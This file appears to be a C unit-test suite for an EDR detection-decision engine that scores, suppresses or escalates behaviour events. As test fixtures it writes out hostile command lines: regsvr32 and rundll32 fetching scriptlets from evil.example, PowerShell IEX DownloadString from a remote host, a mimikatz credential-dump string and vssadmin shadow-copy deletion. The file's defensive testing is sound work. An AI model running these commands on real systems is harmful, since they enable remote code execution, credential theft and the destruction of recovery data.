#include "edr/detection_decision.h"

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void init(EdrBehaviorRecord *r) {
  memset(r, 0, sizeof(*r));
  r->type = EDR_EVENT_PROCESS_CREATE;
  r->priority = 1u;
}

static void test_setenv(const char *k, const char *v) {
#ifdef _WIN32
  _putenv_s(k, v);
#else
  setenv(k, v, 1);
#endif
}

static void test_unsetenv(const char *k) {
#ifdef _WIN32
  _putenv_s(k, "");
#else
  unsetenv(k);
#endif
}

static void test_regsvr32_remote_combo_high(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  snprintf(r.process_name, sizeof(r.process_name), "%s", "regsvr32.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Windows\\System32\\regsvr32.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "regsvr32.exe /s /n /u /i:https://evil.example/a.sct scrobj.dll");
  snprintf(r.parent_name, sizeof(r.parent_name), "%s", "explorer.exe");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(!d.suppress);
  assert(d.confidence >= 0.70f);
  assert(strstr(r.detection_context, "\"remote\":true") != NULL);
  assert(strstr(r.detection_context, "\"signed\":null") != NULL);
  assert(strstr(r.detection_context, "\"signature_trust\"") != NULL);
  assert(strstr(r.detection_context, "\"detection_profile\"") != NULL);
  assert(strstr(r.detection_context, "\"detection_trigger\"") != NULL);
  assert(strstr(r.detection_context, "\"recommended_forensics\"") != NULL);
  assert(d.trigger_pmfe_scan);
  assert(!d.trigger_single_process_minidump);
  assert(strstr(r.detection_context, "\"pmfe_scan\"") != NULL);
  assert(strstr(r.detection_context, "stream_forensic_combo") != NULL);
}

static void test_regsvr32_without_combo_suppressed(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  snprintf(r.process_name, sizeof(r.process_name), "%s", "regsvr32.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Windows\\System32\\regsvr32.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "regsvr32.exe normal.dll");
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(d.confidence <= 0.32f);
  assert(strstr(d.reason, "lolbin_without_combo_condition") != NULL);
  assert(strstr(r.detection_context, "\"suppression\"") != NULL);
  assert(strstr(r.detection_context, "\"confidence_before\"") != NULL);
}

static void test_management_tool_in_enterprise_path_downgrades(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  snprintf(r.process_name, sizeof(r.process_name), "%s", "TeamViewer.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Program Files\\TeamViewer\\TeamViewer.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "TeamViewer.exe --service");
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(d.confidence < 0.25f);
  assert(d.drop);
}

static void test_shellcode_recommends_minidump_and_pmfe(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_PROTOCOL_SHELLCODE;
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s", "detector=yara rule=EternalBlue score=1.0 proto=smb2");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(d.trigger_pmfe_scan);
  assert(!d.trigger_single_process_minidump);
  assert(strstr(r.detection_context, "\"engine\":\"shellcode\"") != NULL);
  assert(strstr(r.detection_context, "\"engine_evidence\"") != NULL);
  assert(strstr(r.detection_context, "\"schema\":\"shellcode_result_v1\"") != NULL);
  assert(strstr(r.detection_context, "\"flow\"") != NULL);
  assert(strstr(r.detection_context, "\"detector\":\"yara\"") != NULL);
  assert(strstr(r.detection_context, "\"rule\":\"EternalBlue\"") != NULL);
  assert(strstr(r.detection_context, "\"proto\":\"smb2\"") != NULL);
  assert(strstr(r.detection_context, "shellcode_high_signal") != NULL);
}

static void test_webshell_triggers_targeted_pmfe(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_WEBSHELL_DETECTED;
  snprintf(r.file_path, sizeof(r.file_path), "%s", "/var/www/html/upload/shell.php");
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s",
           "detector=yara rule=PHP_Webshell_Eval score=0.91 proto=http mitre=T1505.003");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(d.trigger_pmfe_scan);
  assert(strstr(r.detection_context, "\"engine\":\"webshell\"") != NULL);
  assert(strstr(r.detection_context, "\"schema\":\"webshell_result_v1\"") != NULL);
  assert(strstr(r.detection_context, "\"webshell_files\"") != NULL);
  assert(strstr(r.detection_context, "\"targeted_files\":true") != NULL);
  assert(strstr(r.detection_context, "\"rule\":\"PHP_Webshell_Eval\"") != NULL);
  assert(strstr(r.detection_context, "webshell_high_signal") != NULL);
}

static void test_pmfe_result_keeps_memory_evidence(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_PMFE_SCAN_RESULT;
  snprintf(r.pmfe_snapshot, sizeof(r.pmfe_snapshot), "%s", "{\"ave\":0.77,\"mz\":1,\"stomp\":0}");
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s", "detector=pmfe score=0.77 mitre=T1055");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(!d.trigger_pmfe_scan);
  assert(strstr(r.detection_context, "\"engine\":\"pmfe\"") != NULL);
  assert(strstr(r.detection_context, "\"schema\":\"pmfe_result_v1\"") != NULL);
  assert(strstr(r.detection_context, "\"pmfe_snapshot\"") != NULL);
  assert(strstr(r.detection_context, "\"detector\":\"pmfe\"") != NULL);
  assert(strstr(r.detection_context, "pmfe_result_feedback") != NULL);
}

static void test_pmfe_clean_shellcode_followup_closes_without_alert(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_PMFE_SCAN_RESULT;
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s",
           "detector=pmfe followup_only=1 source_alert_id=sc-123 "
           "pmfe_status=completed_clean pmfe_verdict=clean score=0.05 mitre=-");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s",
           "regions=7 private_exec=0 stomp_suspicious=0 mz_hits=0 ave_max_score=0");
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(!d.drop);
  assert(d.confidence < 0.25f);
  assert(strcmp(d.selection_action, "emit_context") == 0);
  assert(strstr(d.reason, "pmfe_followup_clean") != NULL);
  assert(strstr(r.detection_context, "\"source_alert_id\":\"sc-123\"") != NULL);
  assert(strstr(r.detection_context, "\"followup_only\":true") != NULL);
  assert(strstr(r.detection_context, "\"status\":\"completed_clean\"") != NULL);
  assert(strstr(r.detection_context, "\"verdict\":\"clean\"") != NULL);
}

static void test_pmfe_failed_shellcode_followup_reports_context(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_PMFE_SCAN_RESULT;
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s",
           "detector=pmfe followup_only=1 source_alert_id=sc-789 "
           "pmfe_status=failed pmfe_verdict=inconclusive score=0.35 mitre=-");
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(!d.drop);
  assert(d.confidence < 0.25f);
  assert(strcmp(d.selection_action, "emit_context") == 0);
  assert(strstr(d.reason, "pmfe_followup_inconclusive") != NULL);
  assert(strstr(r.detection_context, "\"source_alert_id\":\"sc-789\"") != NULL);
  assert(strstr(r.detection_context, "\"status\":\"failed\"") != NULL);
  assert(strstr(r.detection_context, "\"verdict\":\"inconclusive\"") != NULL);
}

static void test_pmfe_suspicious_shellcode_followup_keeps_alert(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_PMFE_SCAN_RESULT;
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s",
           "detector=pmfe followup_only=1 source_alert_id=sc-456 "
           "pmfe_status=completed_suspicious pmfe_verdict=suspicious score=0.94 mitre=T1055");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s",
           "regions=9 private_exec=1 stomp_suspicious=1 mz_hits=1 ave_max_score=0.94");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.suppress);
  assert(!d.drop);
  assert(d.confidence >= 0.70f);
  assert(strstr(r.detection_context, "\"source_alert_id\":\"sc-456\"") != NULL);
  assert(strstr(r.detection_context, "\"status\":\"completed_suspicious\"") != NULL);
  assert(strstr(r.detection_context, "\"verdict\":\"suspicious\"") != NULL);
}

static void test_rmm_enterprise_allowlist_policy_suppresses_remote_noise(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  test_setenv("EDR_DETECTION_RMM_ALLOWLIST", "ScreenConnect.ClientService.exe,C:\\Program Files\\ScreenConnect\\");
  test_setenv("EDR_DETECTION_RMM_POLICY_VERSION", "tenant-demo-rmm-v1");
  test_setenv("EDR_DETECTION_RMM_ROLLBACK_VERSION", "tenant-demo-rmm-v0");
  snprintf(r.process_name, sizeof(r.process_name), "%s", "ScreenConnect.ClientService.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Program Files\\ScreenConnect\\ClientService.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "ScreenConnect.ClientService.exe --service");
  snprintf(r.net_dst, sizeof(r.net_dst), "%s", "198.51.100.9");
  r.net_dport = 443u;
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(strstr(d.reason, "rmm_enterprise_allowlist_policy") != NULL);
  assert(strstr(r.detection_context, "\"rmm_policy_match\":true") != NULL);
  assert(strstr(r.detection_context, "\"suppression\"") != NULL);
  assert(strstr(r.detection_context, "\"reason\":\"rmm_enterprise_allowlist_policy\"") != NULL);
  assert(strstr(r.detection_context, "\"confidence_after\"") != NULL);
  assert(strstr(r.detection_context, "tenant-demo-rmm-v1") != NULL);
  assert(strstr(r.detection_context, "\"hit_count\":") != NULL);
  assert(strstr(r.detection_context, "\"rollback_available\":true") != NULL);
  assert(strstr(r.detection_context, "tenant-demo-rmm-v0") != NULL);
  test_unsetenv("EDR_DETECTION_RMM_ALLOWLIST");
  test_unsetenv("EDR_DETECTION_RMM_POLICY_VERSION");
  test_unsetenv("EDR_DETECTION_RMM_ROLLBACK_VERSION");
}

static void test_process_context_window_correlates_remote_script(void) {
  EdrBehaviorRecord r1;
  EdrBehaviorRecord r2;
  EdrDetectionDecision d;
  init(&r1);
  r1.type = EDR_EVENT_NET_CONNECT;
  r1.pid = 9901u;
  r1.process_start_key = 0x9901u;
  r1.process_creation_filetime_100ns = 133801632000099010ULL;
  r1.event_time_ns = 1779338600000000000LL;
  snprintf(r1.process_name, sizeof(r1.process_name), "%s", "powershell.exe");
  snprintf(r1.net_dst, sizeof(r1.net_dst), "%s", "203.0.113.77");
  r1.net_dport = 443u;
  edr_detection_decision_evaluate(&r1, &d);

  init(&r2);
  r2.type = EDR_EVENT_SCRIPT_POWERSHELL;
  r2.pid = 9901u;
  r2.process_start_key = r1.process_start_key;
  r2.process_creation_filetime_100ns = r1.process_creation_filetime_100ns;
  r2.event_time_ns = 1779338605000000000LL;
  snprintf(r2.process_name, sizeof(r2.process_name), "%s", "powershell.exe");
  snprintf(r2.cmdline, sizeof(r2.cmdline), "%s", "powershell.exe -nop -enc SQBFAFgA");
  snprintf(r2.script_snippet, sizeof(r2.script_snippet), "%s",
           "sensor=scriptblock script_content=IEX_DownloadString");
  edr_detection_decision_evaluate(&r2, &d);
  assert(!d.drop);
  assert(d.context_correlated);
  assert(d.confidence >= 0.70f);
  assert(d.trigger_pmfe_scan);
  assert(strstr(d.reason, "process_window_remote_script") != NULL);
  assert(strstr(r2.detection_context, "\"process_context\":true") != NULL);
}

static void test_pid_only_parent_context_does_not_cross_generations(void) {
  EdrBehaviorRecord parent;
  EdrBehaviorRecord child;
  EdrDetectionDecision d;
  init(&parent);
  parent.type = EDR_EVENT_SCRIPT_POWERSHELL;
  parent.pid = 9902u;
  parent.process_start_key = 0x9902u;
  parent.process_creation_filetime_100ns = 133801632000099020ULL;
  parent.event_time_ns = 1779338610000000000LL;
  snprintf(parent.process_name, sizeof(parent.process_name), "%s", "powershell.exe");
  snprintf(parent.cmdline, sizeof(parent.cmdline), "%s", "powershell.exe -nop IEX DownloadString('https://evil/a.ps1')");
  snprintf(parent.script_snippet, sizeof(parent.script_snippet), "%s", "sensor=scriptblock script_content=IEX_DownloadString");
  edr_detection_decision_evaluate(&parent, &d);

  init(&child);
  child.type = EDR_EVENT_PROCESS_CREATE;
  child.pid = 9903u;
  child.ppid = 9902u;
  child.process_start_key = 0x9903u;
  child.process_creation_filetime_100ns = 133801632000099030ULL;
  child.event_time_ns = 1779338615000000000LL;
  snprintf(child.process_name, sizeof(child.process_name), "%s", "regsvr32.exe");
  snprintf(child.exe_path, sizeof(child.exe_path), "%s", "C:\\Windows\\System32\\regsvr32.exe");
  snprintf(child.cmdline, sizeof(child.cmdline), "%s", "regsvr32.exe normal.dll");
  edr_detection_decision_evaluate(&child, &d);
  assert(!d.drop);
  assert(d.suppress);
  assert(!d.context_correlated);
  assert(strstr(d.reason, "process_tree_parent_remote_script") == NULL);
  assert(strstr(child.detection_context, "\"process_context\":false") != NULL);
}

static void test_file_policy_allowlist_suppresses_known_rmm(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  const char *path = "edr_detection_rmm_allowlist.txt";
  FILE *f = fopen(path, "wb");
  assert(f != NULL);
  fputs("ScreenConnect.ClientService.exe\nC:\\Program Files\\ScreenConnect\\\n", f);
  fclose(f);
  test_setenv("EDR_DETECTION_RMM_ALLOWLIST_FILE", path);
  test_setenv("EDR_DETECTION_RMM_POLICY_VERSION", "tenant-demo-rmm-file-v1");
  init(&r);
  snprintf(r.process_name, sizeof(r.process_name), "%s", "ScreenConnect.ClientService.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Program Files\\ScreenConnect\\ClientService.exe");
  snprintf(r.net_dst, sizeof(r.net_dst), "%s", "198.51.100.9");
  r.net_dport = 443u;
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(strstr(d.reason, "rmm_enterprise_allowlist_policy") != NULL);
  assert(strstr(r.detection_context, "\"suppression\"") != NULL);
  assert(strstr(r.detection_context, "tenant-demo-rmm-file-v1") != NULL);
  test_unsetenv("EDR_DETECTION_RMM_ALLOWLIST_FILE");
  test_unsetenv("EDR_DETECTION_RMM_POLICY_VERSION");
  remove(path);
}

static void test_false_positive_feedback_policy_suppresses_known_tool(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  test_setenv("EDR_DETECTION_FP_FEEDBACK", "AcmeBackup.exe,C:\\Program Files\\AcmeBackup\\");
  test_setenv("EDR_DETECTION_FP_POLICY_VERSION", "tenant-fp-v3");
  test_setenv("EDR_DETECTION_FP_ROLLBACK_VERSION", "tenant-fp-v2");
  snprintf(r.process_name, sizeof(r.process_name), "%s", "AcmeBackup.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Program Files\\AcmeBackup\\AcmeBackup.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "AcmeBackup.exe --sync");
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(d.drop);
  assert(strstr(d.reason, "false_positive_feedback_policy") != NULL);
  assert(strstr(r.detection_context, "\"false_positive_feedback\":true") != NULL);
  assert(strstr(r.detection_context, "\"reason\":\"false_positive_feedback_policy\"") != NULL);
  assert(strstr(r.detection_context, "tenant-fp-v3") != NULL);
  assert(strstr(r.detection_context, "tenant-fp-v2") != NULL);
  assert(strstr(r.detection_context, "\"hit_count\":") != NULL);
  test_unsetenv("EDR_DETECTION_FP_FEEDBACK");
  test_unsetenv("EDR_DETECTION_FP_POLICY_VERSION");
  test_unsetenv("EDR_DETECTION_FP_ROLLBACK_VERSION");
}

static void test_event_quality_high_signal_emits_alert(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_PROTOCOL_SHELLCODE;
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s",
           "detector=yara rule=CobaltStrike score=0.96 proto=http");
  snprintf(r.net_dst, sizeof(r.net_dst), "%s", "203.0.113.50");
  r.net_dport = 443u;
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(!d.suppress);
  assert(d.event_quality_score >= 80u);
  assert(strcmp(d.selection_action, "emit_alert") == 0);
  assert(strstr(d.signal_reasons, "shellcode_signal") != NULL);
  assert(d.noise_reasons[0] == '\0');
  assert(strstr(r.detection_context, "\"event_quality\"") != NULL);
  assert(strstr(r.detection_context, "\"selection_action\":\"emit_alert\"") != NULL);
  assert(strstr(r.detection_context, "\"signal_reasons\":[") != NULL);
}

static void test_event_quality_fp_feedback_downgrades(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  test_setenv("EDR_DETECTION_FP_FEEDBACK", "FDSensorTaskLaunch.ps1,C:\\Program Files\\FDSecurity\\");
  snprintf(r.process_name, sizeof(r.process_name), "%s", "powershell.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s",
           "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Program Files\\FDSecurity\\FDSensorTaskLaunch.ps1");
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(strstr(d.noise_reasons, "false_positive_feedback_policy") != NULL);
  assert(d.suppression_score > 0u);
  /* suppress 时不应是 emit_alert；低分应落入 local_only / drop。 */
  assert(strcmp(d.selection_action, "emit_alert") != 0);
  assert(strstr(r.detection_context, "\"noise_reasons\":[") != NULL);
  assert(strstr(r.detection_context, "false_positive_feedback_policy") != NULL);
  test_unsetenv("EDR_DETECTION_FP_FEEDBACK");
}

static void test_event_quality_p0_forces_alert(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.priority = 0u; /* P0 */
  r.type = EDR_EVENT_PROTOCOL_SHELLCODE;
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s", "detector=yara rule=EternalBlue score=1.0 proto=smb2");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(strcmp(d.selection_action, "emit_alert") == 0);
}

static void test_event_quality_suppressed_p0_caps_at_context(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.priority = 0u;
  test_setenv("EDR_DETECTION_FP_FEEDBACK",
              "FDSensorTaskLaunch.ps1,C:\\Program Files\\FDSecurity\\");
  snprintf(r.process_name, sizeof(r.process_name), "%s", "powershell.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s",
           "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s",
           "powershell.exe -File C:\\Program Files\\FDSecurity\\FDSensorTaskLaunch.ps1");
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(!d.drop);
  assert(strcmp(d.selection_action, "emit_context") == 0);
  test_unsetenv("EDR_DETECTION_FP_FEEDBACK");
}

static void test_conditional_suppression_downgrades_matching_variant(void) {
  /* 紧凑串：target \037 process \037 action \037 reason \037 contains_all(\035)。
   * 用八进制转义避免 \x 贪婪吞掉后续十六进制字母。 */
  const char *rules =
      "R-LOLBIN-002\037rundll32.exe\037downgrade\037auto_fp_R-LOLBIN-002\037"
      "davclnt.dll,DavSetCookie\035localhost";
  test_setenv("EDR_DETECTION_SUPPRESSION_RULES", rules);

  /* 命中条件（rundll32 + davclnt + localhost）→ 降级。 */
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  snprintf(r.process_name, sizeof(r.process_name), "%s", "rundll32.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Windows\\System32\\rundll32.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s",
           "rundll32.exe C:\\WINDOWS\\system32\\davclnt.dll,DavSetCookie localhost@9843 http://localhost:9843/desktop.ini");
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(strstr(d.reason, "conditional_suppression") != NULL);
  assert(strstr(d.noise_reasons, "conditional_suppression") != NULL);

  /* 同进程但外链（非 localhost）→ 不命中条件 → 保留告警能力。 */
  EdrBehaviorRecord r2;
  EdrDetectionDecision d2;
  init(&r2);
  snprintf(r2.process_name, sizeof(r2.process_name), "%s", "rundll32.exe");
  snprintf(r2.exe_path, sizeof(r2.exe_path), "%s", "C:\\Windows\\System32\\rundll32.exe");
  snprintf(r2.cmdline, sizeof(r2.cmdline), "%s",
           "rundll32.exe davclnt.dll,DavSetCookie http://evil.example/payload.sct");
  edr_detection_decision_evaluate(&r2, &d2);
  assert(strstr(d2.reason, "conditional_suppression") == NULL);

  test_unsetenv("EDR_DETECTION_SUPPRESSION_RULES");
}

static void test_conditional_suppression_skips_high_signal(void) {
  const char *rules = "R-X\037powershell.exe\037drop\037r\037encodedcommand";
  test_setenv("EDR_DETECTION_SUPPRESSION_RULES", rules);
  /* 凭据转储等高危信号不应被条件化 suppression 误降级。 */
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  snprintf(r.process_name, sizeof(r.process_name), "%s", "powershell.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s",
           "powershell.exe -EncodedCommand SQBFAFgA ; lsass mimikatz sekurlsa::logonpasswords");
  edr_detection_decision_evaluate(&r, &d);
  assert(strstr(d.reason, "conditional_suppression") == NULL);
  test_unsetenv("EDR_DETECTION_SUPPRESSION_RULES");
}

static void test_ransom_recovery_requires_dangerous_args(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_PROCESS_CREATE;
  r.pid = 7722u;
  snprintf(r.process_name, sizeof(r.process_name), "%s", "vssadmin.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "vssadmin.exe list shadows");
  edr_detection_decision_evaluate(&r, &d);
  assert(strstr(d.reason, "ransom_recovery_tamper") == NULL);
  assert(strstr(r.detection_context, "\"ransom_recovery_tamper\":true") == NULL);
}

static void test_ransom_single_counter_does_not_emit_burst(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_FILE_WRITE;
  r.pid = 7723u;
  snprintf(r.process_name, sizeof(r.process_name), "%s", "sync_update.exe");
  snprintf(r.file_path, sizeof(r.file_path), "%s", "C:\\Users\\alice\\Documents\\report.docx");
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s", "ransom_counter=1 file_rate=10 ext_burst=0 dir_burst=0 content_entropy=0 content_sample_bytes=0");
  edr_detection_decision_evaluate(&r, &d);
  assert(strstr(d.reason, "ransom_file_burst") == NULL);
  assert(strstr(r.detection_context, "\"ransom_behavior\":true") == NULL);
}

static void test_ransom_recovery_plus_file_burst_still_alerts(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_FILE_WRITE;
  r.pid = 7724u;
  snprintf(r.process_name, sizeof(r.process_name), "%s", "vssadmin.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "vssadmin.exe delete shadows /all /quiet");
  snprintf(r.file_path, sizeof(r.file_path), "%s", "C:\\Users\\alice\\Documents\\invoice.locked");
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s", "file_rate=30 ext_burst=9 dir_burst=2");
  edr_detection_decision_evaluate(&r, &d);
  assert(strstr(d.reason, "ransom_recovery_tamper") != NULL);
  assert(strstr(d.reason, "ransom_behavior_counter") != NULL);
  assert(strstr(r.detection_context, "\"ransom_recovery_tamper\":true") != NULL);
  assert(strstr(r.detection_context, "\"ransom_behavior\":true") != NULL);
  assert(strstr(r.detection_context, "ENCRYPTION_CONFIRMED") == NULL);
}

static void test_ransom_control_threshold_context(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  test_setenv("EDR_RANSOM_CHAIN_CANDIDATE_SCORE", "45");
  test_setenv("EDR_RANSOM_CHAIN_P0_SCORE", "65");
  test_setenv("EDR_RANSOM_NOTE_MIN_FILES", "3");
  test_setenv("EDR_RANSOM_NOTE_WINDOW_S", "600");
  r.type = EDR_EVENT_FILE_WRITE;
  r.pid = 9910u;
  snprintf(r.process_name, sizeof(r.process_name), "%s", "sync_update.exe");
  snprintf(r.file_path, sizeof(r.file_path), "%s", "C:\\Users\\alice\\Documents\\HOW_TO_RESTORE.txt");
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s",
           "ransom_note_count=3 ransom_note_burst=1");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(strstr(d.reason, "ransom_note_burst") != NULL);
  assert(strstr(r.detection_context, "\"ransom_control\"") != NULL);
  assert(strstr(r.detection_context, "\"version\":\"ransom-control-v3\"") != NULL);
  assert(strstr(r.detection_context, "\"note_count\":3") != NULL);
  assert(strstr(r.detection_context, "\"note_min_files\":3") != NULL);
  assert(strstr(r.detection_context, "\"note_window_s\":600") != NULL);
  assert(strstr(r.detection_context, "\"candidate_score\":45") != NULL);
  assert(strstr(r.detection_context, "\"p0_score\":65") != NULL);
  assert(strstr(r.detection_context, "\"direct_emit_single_note\":false") != NULL);
  test_unsetenv("EDR_RANSOM_CHAIN_CANDIDATE_SCORE");
  test_unsetenv("EDR_RANSOM_CHAIN_P0_SCORE");
  test_unsetenv("EDR_RANSOM_NOTE_MIN_FILES");
  test_unsetenv("EDR_RANSOM_NOTE_WINDOW_S");
}

int main(void) {
  test_regsvr32_remote_combo_high();
  test_regsvr32_without_combo_suppressed();
  test_management_tool_in_enterprise_path_downgrades();
  test_shellcode_recommends_minidump_and_pmfe();
  test_webshell_triggers_targeted_pmfe();
  test_pmfe_result_keeps_memory_evidence();
  test_pmfe_clean_shellcode_followup_closes_without_alert();
  test_pmfe_failed_shellcode_followup_reports_context();
  test_pmfe_suspicious_shellcode_followup_keeps_alert();
  test_rmm_enterprise_allowlist_policy_suppresses_remote_noise();
  test_process_context_window_correlates_remote_script();
  test_pid_only_parent_context_does_not_cross_generations();
  test_file_policy_allowlist_suppresses_known_rmm();
  test_false_positive_feedback_policy_suppresses_known_tool();
  test_event_quality_high_signal_emits_alert();
  test_event_quality_fp_feedback_downgrades();
  test_event_quality_p0_forces_alert();
  test_event_quality_suppressed_p0_caps_at_context();
  test_conditional_suppression_downgrades_matching_variant();
  test_conditional_suppression_skips_high_signal();
  test_ransom_recovery_requires_dangerous_args();
  test_ransom_single_counter_does_not_emit_burst();
  test_ransom_recovery_plus_file_burst_still_alerts();
  test_ransom_control_threshold_context();
  puts("detection_decision ok");
  return 0;
}
